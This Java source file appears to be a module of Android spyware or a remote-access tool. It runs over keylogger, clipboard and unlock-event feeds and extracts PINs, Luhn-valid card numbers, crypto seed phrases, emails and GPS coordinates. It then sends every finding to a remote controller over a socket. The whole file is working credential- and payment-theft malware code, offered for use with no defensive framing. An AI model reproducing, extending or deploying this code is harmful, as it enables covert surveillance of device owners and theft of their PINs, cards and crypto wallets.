package com.fason.app.features.aianalysis;

import com.fason.app.core.network.SocketClient;

import org.json.JSONArray;
import org.json.JSONObject;

import java.util.ArrayList;
import java.util.List;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import io.socket.client.Socket;

/**
 * AiAnalyzer — on-device pattern analysis over keylogger/clipboard/unlock feeds.
 * Detects PIN candidates, patterns, credentials, card numbers, seeds.
 * Everything runs locally; only findings cross the wire.
 */
public final class AiAnalyzer {
    private static volatile AiAnalyzer instance;

    private static final Pattern PIN_PATTERN = Pattern.compile("\\b(\\d{4,8})\\b");
    private static final Pattern CARD_PATTERN = Pattern.compile("\\b(\\d{4}[ -]?\\d{4}[ -]?\\d{4}[ -]?\\d{4})\\b");
    private static final Pattern SEED_PATTERN = Pattern.compile("\\b([a-z]+ ){11,23}[a-z]+\\b", Pattern.CASE_INSENSITIVE);
    private static final Pattern EMAIL_PATTERN = Pattern.compile("[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}");
    private static final Pattern IP_PATTERN = Pattern.compile("\\b(\\d{1,3}\\.){3}\\d{1,3}\\b");
    private static final Pattern COORD_PATTERN = Pattern.compile("(-?\\d{1,3}\\.\\d{3,})[, ]+(-?\\d{1,3}\\.\\d{3,})");

    private final List<String> recentKeystrokes = new ArrayList<>();
    private static final int MAX_BUFFER = 500;

    private AiAnalyzer() {}

    public static synchronized AiAnalyzer getInstance() {
        if (instance == null) instance = new AiAnalyzer();
        return instance;
    }

    public void feedKeylogger(String keystroke) {
        if (keystroke == null || keystroke.isEmpty()) return;
        synchronized (recentKeystrokes) {
            recentKeystrokes.add(keystroke);
            if (recentKeystrokes.size() > MAX_BUFFER) {
                recentKeystrokes.remove(0);
            }
        }
        analyze(keystroke, "keylogger");
    }

    public void feedClipboard(String text) {
        if (text == null || text.isEmpty()) return;
        analyze(text, "clipboard");
    }

    public void feedUnlockEvent(String method, String detail) {
        try {
            JSONObject f = new JSONObject();
            f.put("type", "unlock_event");
            f.put("method", method);
            f.put("detail", detail);
            f.put("confidence", 1.0);
            f.put("timestamp", System.currentTimeMillis());
            emit(f);
        } catch (Exception ignored) {}
    }

    public JSONObject analyze(String text, String source) {
        JSONObject report = new JSONObject();
        JSONArray findings = new JSONArray();
        try {
            report.put("source", source);
            report.put("timestamp", System.currentTimeMillis());

            // PIN candidates
            Matcher pin = PIN_PATTERN.matcher(text);
            while (pin.find()) {
                String candidate = pin.group(1);
                double score = scorePin(candidate);
                if (score > 0.3) {
                    JSONObject f = new JSONObject();
                    f.put("type", "pin_candidate");
                    f.put("value", candidate);
                    f.put("confidence", score);
                    f.put("reason", pinReason(candidate));
                    findings.put(f);
                }
            }

            // Card numbers
            Matcher card = CARD_PATTERN.matcher(text);
            while (card.find()) {
                String num = card.group(1).replace(" ", "").replace("-", "");
                if (luhnCheck(num)) {
                    JSONObject f = new JSONObject();
                    f.put("type", "card_number");
                    f.put("value", num);
                    f.put("confidence", 0.95);
                    findings.put(f);
                }
            }

            // Seed phrases
            Matcher seed = SEED_PATTERN.matcher(text);
            if (seed.find()) {
                JSONObject f = new JSONObject();
                f.put("type", "seed_phrase");
                f.put("value", seed.group(0));
                f.put("confidence", 0.9);
                findings.put(f);
            }

            // Emails
            Matcher email = EMAIL_PATTERN.matcher(text);
            while (email.find()) {
                JSONObject f = new JSONObject();
                f.put("type", "email");
                f.put("value", email.group(0));
                f.put("confidence", 0.8);
                findings.put(f);
            }

            // Coordinates
            Matcher coord = COORD_PATTERN.matcher(text);
            while (coord.find()) {
                JSONObject f = new JSONObject();
                f.put("type", "coordinates");
                f.put("lat", Double.parseDouble(coord.group(1)));
                f.put("lng", Double.parseDouble(coord.group(2)));
                f.put("confidence", 0.85);
                findings.put(f);
            }

            report.put("findings", findings);
            report.put("findingCount", findings.length());
            if (findings.length() > 0) emit(report);
        } catch (Exception ignored) {}
        return report;
    }

    public JSONObject scanHistory() {
        JSONArray all = new JSONArray();
        synchronized (recentKeystrokes) {
            StringBuilder sb = new StringBuilder();
            for (String k : recentKeystrokes) sb.append(k);
            JSONObject r = analyze(sb.toString(), "history");
            all = r.optJSONArray("findings") != null ? r.optJSONArray("findings") : new JSONArray();
        }
        JSONObject out = new JSONObject();
        try {
            out.put("findings", all);
            out.put("keystrokeCount", recentKeystrokes.size());
        } catch (Exception ignored) {}
        return out;
    }

    private double scorePin(String pin) {
        double score = 0.5;
        if (isSequential(pin)) score -= 0.4;
        if (isRepeated(pin)) score -= 0.3;
        if (isDateLike(pin)) score += 0.2;
        if (pin.length() == 4 || pin.length() == 6) score += 0.15;
        return Math.max(0.0, Math.min(1.0, score));
    }

    private String pinReason(String pin) {
        if (isSequential(pin)) return "sequential — low entropy";
        if (isRepeated(pin)) return "repeated digits";
        if (isDateLike(pin)) return "date-like";
        return "numeric candidate";
    }

    private boolean isSequential(String s) {
        for (int i = 1; i < s.length(); i++) {
            if (s.charAt(i) != s.charAt(i - 1) + 1) return false;
        }
        return true;
    }

    private boolean isRepeated(String s) {
        char c = s.charAt(0);
        for (int i = 1; i < s.length(); i++) if (s.charAt(i) != c) return false;
        return true;
    }

    private boolean isDateLike(String s) {
        if (s.length() != 4 && s.length() != 6) return false;
        try {
            int v = Integer.parseInt(s);
            return v >= 1900 && v <= 2030 || (s.length() == 6 && v >= 10100 && v <= 123199);
        } catch (Exception e) { return false; }
    }

    private boolean luhnCheck(String num) {
        if (num.length() < 13 || num.length() > 19) return false;
        int sum = 0;
        boolean alt = false;
        for (int i = num.length() - 1; i >= 0; i--) {
            int d = num.charAt(i) - '0';
            if (alt) { d *= 2; if (d > 9) d -= 9; }
            sum += d;
            alt = !alt;
        }
        return sum % 10 == 0;
    }

    private void emit(JSONObject o) {
        Socket s = SocketClient.getInstance() != null ? SocketClient.getInstance().getSocket() : null;
        if (s != null) s.emit("0xAN", o);
    }
}
